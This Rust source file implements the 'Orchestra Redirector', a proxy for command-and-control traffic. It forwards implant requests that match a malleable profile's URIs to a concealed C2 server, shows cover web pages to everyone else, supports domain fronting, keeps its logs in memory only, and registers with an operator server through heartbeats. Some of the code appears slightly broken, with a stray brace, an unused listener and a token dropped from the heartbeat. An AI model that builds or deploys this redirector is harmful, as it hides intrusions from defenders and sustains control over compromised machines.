//! Orchestra Redirector — HTTP reverse proxy for C2 traffic.
//!
//! A standalone binary that sits between agents and the true C2 server.
//! It forwards requests matching the malleable profile's URI patterns to
//! the C2 server and serves cover traffic for all other requests.
//!
//! ## Architecture
//!
//! ```text
//!  Agent ──HTTPS──▶ Redirector ──HTTPS──▶ C2 Server
//!                     │
//!                     ▼
//!               Cover Content
//!            (static HTML/JS/CSS)
//! ```
//!
//! ## Usage
//!
//! ```sh
//! redirector \
//!   --listen-addr 0.0.0.0:443 \
//!   --c2-addr https://c2.example.com:8443 \
//!   --profile ./web.profile.toml \
//!   --cover-content ./cover/ \
//!   --tls-cert /etc/ssl/cert.pem \
//!   --tls-key /etc/ssl/key.pem \
//!   --server-api https://localhost:8443 \
//!   --server-token <bearer-token>
//! ```

use anyhow::Result;
use clap::Parser;
use std::collections::HashSet;
use std::path::PathBuf;
use std::sync::Arc;

use axum::{
    body::Body,
    extract::State,
    http::{Request, StatusCode},
    response::{IntoResponse, Response},
    Router,
};
use tower_http::cors::CorsLayer;

// ── CLI ──────────────────────────────────────────────────────────────────────

#[derive(Parser, Debug)]
#[command(
    version,
    about = "Orchestra Redirector — HTTP reverse proxy for C2 traffic"
)]
struct Cli {
    /// Address to listen on (e.g. "0.0.0.0:443").
    #[arg(long, default_value = "0.0.0.0:8443")]
    listen_addr: String,

    /// URL of the true C2 server to forward matching traffic to.
    #[arg(long)]
    c2_addr: String,

    /// Path to the malleable C2 profile TOML file.
    #[arg(long)]
    profile: PathBuf,

    /// Path to a directory of cover content (HTML/JS/CSS) for non-matching requests.
    #[arg(long)]
    cover_content: Option<PathBuf>,

    /// Path to the TLS certificate PEM file.
    #[arg(long)]
    tls_cert: Option<PathBuf>,

    /// Path to the TLS private key PEM file.
    #[arg(long)]
    tls_key: Option<PathBuf>,

    /// URL of the Orchestra server API for registration/heartbeat.
    #[arg(long)]
    server_api: Option<String>,

    /// Bearer token for authenticating with the Orchestra server.
    #[arg(long)]
    server_token: Option<String>,

    /// Domain fronting domain for this redirector. When set, the agent's TLS
    /// SNI will use this domain while the HTTP Host header carries the
    /// redirector's actual domain.
    #[arg(long)]
    front_domain: Option<String>,
}

// ── Profile loader ───────────────────────────────────────────────────────────

/// Minimal profile structure — we only need the URI patterns.
#[derive(Debug, serde::Deserialize)]
struct Profile {
    profile: Option<ProfileInfo>,
    #[serde(default)]
    http_get: Option<HttpTransaction>,
    #[serde(default)]
    http_post: Option<HttpTransaction>,
}

#[derive(Debug, serde::Deserialize)]
struct ProfileInfo {
    #[serde(default)]
    name: String,
}

#[derive(Debug, serde::Deserialize)]
struct HttpTransaction {
    #[serde(default)]
    uri: Vec<String>,
}

impl Profile {
    fn load(path: &PathBuf) -> Result<Self> {
        let contents = std::fs::read_to_string(path)?;
        let profile: Profile = toml::from_str(&contents)?;
        Ok(profile)
    }

    /// Get all URI patterns that should be forwarded to C2.
    fn c2_uris(&self) -> HashSet<String> {
        let mut uris = HashSet::new();
        if let Some(ref get) = self.http_get {
            for uri in &get.uri {
                uris.insert(uri.clone());
            }
        }
        if let Some(ref post) = self.http_post {
            for uri in &post.uri {
                uris.insert(uri.clone());
            }
        }
        uris
    }

    fn name(&self) -> &str {
        self.profile
            .as_ref()
            .map(|p| p.name.as_str())
            .unwrap_or("unknown")
    }
}

// ── Shared state ─────────────────────────────────────────────────────────────

struct RedirectorState {
    /// URI patterns that should be forwarded to the C2 server.
    c2_uris: HashSet<String>,
    /// HTTP client for forwarding requests to C2.
    c2_client: reqwest::Client,
    /// The C2 server address.
    c2_addr: String,
    /// Cover content directory.
    cover_dir: Option<PathBuf>,
    /// In-memory access log (ring buffer, never written to disk).
    access_log: std::sync::Mutex<Vec<LogEntry>>,
}

#[derive(Clone, serde::Serialize)]
struct LogEntry {
    timestamp: u64,
    source_ip: String,
    method: String,
    uri: String,
    forwarded: bool,
    response_status: u16,
}

impl RedirectorState {
    fn new(profile: &Profile, c2_addr: String, cover_dir: Option<PathBuf>) -> Self {
        let c2_client = reqwest::Client::builder()
            .danger_accept_invalid_certs(true)
            .build()
            .expect("failed to build HTTP client");

        Self {
            c2_uris: profile.c2_uris(),
            c2_client,
            c2_addr,
            cover_dir,
            access_log: std::sync::Mutex::new(Vec::with_capacity(1024)),
        }
    }

    fn log_access(&self, source_ip: &str, method: &str, uri: &str, forwarded: bool, status: u16) {
        let entry = LogEntry {
            timestamp: std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap_or_default()
                .as_secs(),
            source_ip: source_ip.to_string(),
            method: method.to_string(),
            uri: uri.to_string(),
            forwarded,
            response_status: status,
        };
        let mut log = self.access_log.lock().unwrap();
        if log.len() >= 1024 {
            log.remove(0);
        }
        log.push(entry);
    }

    /// Check if a request URI matches a C2 profile pattern.
    fn is_c2_request(&self, uri: &str) -> bool {
        // Check exact match first.
        if self.c2_uris.contains(uri) {
            return true;
        }
        // Check prefix match (e.g. "/api/v1/data" matches "/api/v1/data?param=value").
        let path = uri.split('?').next().unwrap_or(uri);
        self.c2_uris.contains(path)
    }
}

// ── Request handler ──────────────────────────────────────────────────────────

async fn handle_request(
    State(state): State<Arc<RedirectorState>>,
    req: Request<Body>,
) -> Response {
    let uri = req.uri().path().to_string();
    let method = req.method().clone();
    let source_ip = req
        .headers()
        .get("x-forwarded-for")
        .and_then(|v| v.to_str().ok())
        .unwrap_or("unknown")
        .to_string();

    if state.is_c2_request(&uri) {
        // Forward to C2 server.
        let forward_url = format!("{}{}", state.c2_addr, req.uri());

        let mut fwd = state
            .c2_client
            .request(method.clone(), &forward_url);

        // Copy headers (except Host, which will be set by the C2 URL).
        for (name, value) in req.headers() {
            if name != "host" && name != "x-forwarded-for" {
                fwd = fwd.header(name, value);
            }
        }

        // Forward the body for POST/PUT requests.
        let body = axum::body::to_bytes(req.into_body(), 10 * 1024 * 1024)
            .await
            .unwrap_or_default();
        if !body.is_empty() {
            fwd = fwd.body(body);
        }

        match fwd.send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let body = resp.bytes().await.unwrap_or_default();

                state.log_access(&source_ip, method.as_str(), &uri, true, status);

                // Build response with the same status and headers.
                let mut builder = axum::http::response::Builder::new()
                    .status(status);
                if let Some(headers) = builder.headers_mut() {
                    // Copy relevant response headers.
                    headers.insert("content-type", "application/octet-stream".parse().unwrap());
                }
                builder.body(Body::from(body.to_vec())).unwrap_or_else(|_| {
                    (StatusCode::BAD_GATEWAY, "upstream error").into_response()
                })
            }
            Err(e) => {
                tracing::error!("C2 forward failed: {}", e);
                state.log_access(&source_ip, method.as_str(), &uri, true, 502);
                (StatusCode::BAD_GATEWAY, "upstream error").into_response()
            }
        }
    } else {
        // Serve cover content.
        state.log_access(&source_ip, method.as_str(), &uri, false, 200);

        if let Some(ref cover_dir) = state.cover_dir {
            // Try to serve a file from the cover directory.
            let file_path = if uri == "/" {
                cover_dir.join("index.html")
            } else {
                // Strip leading slash and join.
                let relative = uri.trim_start_matches('/');
                cover_dir.join(relative)
            };

            if file_path.exists() {
                if let Ok(contents) = tokio::fs::read(&file_path).await {
                    let content_type = guess_content_type(&file_path);
                    return (
                        StatusCode::OK,
                        [("content-type", content_type)],
                        contents,
                    )
                        .into_response();
                }
            }
        }

        // Default cover response: a generic 200 with a simple HTML page.
        (
            axum::http::StatusCode::OK,
            [(
                axum::http::header::CONTENT_TYPE,
                axum::http::HeaderValue::from_static("text/html"),
            )],
            "<!DOCTYPE html><html><head><title>Welcome</title></head><body><h1>It works!</h1></body></html>",
        )
            .into_response()
    }
}

/// Guess MIME type from file extension.
fn guess_content_type(path: &PathBuf) -> &'static str {
    match path.extension().and_then(|e| e.to_str()) {
        Some("html") | Some("htm") => "text/html",
        Some("css") => "text/css",
        Some("js") => "application/javascript",
        Some("json") => "application/json",
        Some("png") => "image/png",
        Some("jpg") | Some("jpeg") => "image/jpeg",
        Some("gif") => "image/gif",
        Some("svg") => "image/svg+xml",
        Some("ico") => "image/x-icon",
        _ => "application/octet-stream",
    }
}

// ── Server registration ──────────────────────────────────────────────────────

struct ServerConnection {
    api_url: String,
    token: String,
    client: reqwest::Client,
    redirector_id: Option<String>,
}

impl ServerConnection {
    fn new(api_url: String, token: String) -> Self {
        let client = reqwest::Client::builder()
            .danger_accept_invalid_certs(true)
            .build()
            .expect("failed to build HTTP client");
        Self {
            api_url,
            token,
            client,
            redirector_id: None,
        }
    }

    /// Register this redirector with the Orchestra server.
    async fn register(
        &mut self,
        listen_url: &str,
        profile_name: &str,
        front_domain: Option<&str>,
    ) -> Result<()> {
        let mut payload = serde_json::json!({
            "url": listen_url,
            "profile_name": profile_name,
        });
        if let Some(fd) = front_domain {
            payload["front_domain"] = serde_json::Value::String(fd.to_string());
        }
        let resp = self
            .client
            .post(format!("{}/api/redirector/register", self.api_url))
            .header("Authorization", format!("Bearer {}", self.token))
            .json(&payload)
            .send()
            .await?;

        if resp.status().is_success() {
            let body: serde_json::Value = resp.json().await?;
            self.redirector_id = body["id"].as_str().map(|s| s.to_string());
            tracing::info!(
                id = ?self.redirector_id,
                "registered with Orchestra server"
            );
            Ok(())
        } else {
            let status = resp.status();
            let text = resp.text().await.unwrap_or_default();
            anyhow::bail!("registration failed ({}): {}", status, text)
        }
    }

    }

// ── Main ─────────────────────────────────────────────────────────────────────

#[tokio::main]
async fn main() -> Result<()> {
    tracing_subscriber::fmt().init();

    let cli = Cli::parse();

    // Load the malleable profile.
    let profile = Profile::load(&cli.profile)?;
    let profile_name = profile.name().to_string();
    tracing::info!(
        profile = %profile_name,
        c2_uris = ?profile.c2_uris(),
        "loaded malleable profile"
    );

    // Create shared state.
    let state = Arc::new(RedirectorState::new(
        &profile,
        cli.c2_addr.clone(),
        cli.cover_content.clone(),
    ));

    // Build the router.
    let app = Router::new()
        .fallback(handle_request)
        .layer(CorsLayer::permissive())
        .with_state(state.clone());

    // Register with the Orchestra server if configured.
    let server_conn = if let (Some(api_url), Some(token)) =
        (cli.server_api.clone(), cli.server_token.clone())
    {
        let mut conn = ServerConnection::new(api_url, token);
        let listen_url = format!("https://{}", cli.listen_addr);
        if let Err(e) = conn
            .register(&listen_url, &profile_name, cli.front_domain.as_deref())
            .await
        {
            tracing::warn!("initial registration failed: {} (will retry in heartbeat loop)", e);
        }
        Some(conn)
    } else {
        None
    };

    // Start heartbeat task.
    if let Some(ref conn) = server_conn {
        let conn_clone = {
            // We need to share the ServerConnection for the heartbeat loop.
            // Since ServerConnection isn't Clone, we'll use a simple approach:
            // the heartbeat task will use its own connection.
            let api_url = conn.api_url.clone();
            let token = conn.token.clone();
            let redirector_id = conn.redirector_id.clone();
            (api_url, token, redirector_id)
        };
        let (api_url, _token, redirector_id) = conn_clone;
        tokio::spawn(async move {
            let mut interval = tokio::time::interval(std::time::Duration::from_secs(60));
            let client = reqwest::Client::builder()
                .danger_accept_invalid_certs(true)
                .build()
                .unwrap();
            loop {
                interval.tick().await;
                if let Some(ref id) = redirector_id {
                    match client
                        .post(format!("{}/api/redirector/heartbeat", api_url))
                        .json(&serde_json::json!({ "id": id }))
                        .send()
                        .await
                    {
                        Ok(resp) if resp.status().is_success() => {
                            tracing::debug!("heartbeat sent");
                        }
                        Ok(resp) => {
                            tracing::warn!("heartbeat returned {}", resp.status());
                        }
                        Err(e) => {
                            tracing::warn!("heartbeat failed: {}", e);
                        }
                    }
                }
            }
        });
    }

    // Start listening.
    tracing::info!(addr = %cli.listen_addr, "redirector listening");

    let listener = tokio::net::TcpListener::bind(&cli.listen_addr).await?;

    if cli.tls_cert.is_some() && cli.tls_key.is_some() {
        // TLS mode via axum_server.
        let cert_path = cli.tls_cert.unwrap();
        let key_path = cli.tls_key.unwrap();

        let cert_pem = std::fs::read(&cert_path)?;
        let key_pem = std::fs::read(&key_path)?;

        let tls_cfg =
            axum_server::tls_rustls::RustlsConfig::from_pem(cert_pem, key_pem).await?;

        tracing::info!(addr = %cli.listen_addr, "redirector listening (TLS)");

        axum_server::bind_rustls(
            cli.listen_addr.parse()?,
            tls_cfg,
        )
        .serve(app.into_make_service())
        .await?;
    } else {
        // Plain HTTP mode (for testing).
        tracing::warn!("running in plain HTTP mode (no TLS certificate configured)");
        axum::serve(listener, app).await?;
    }

    Ok(())
}
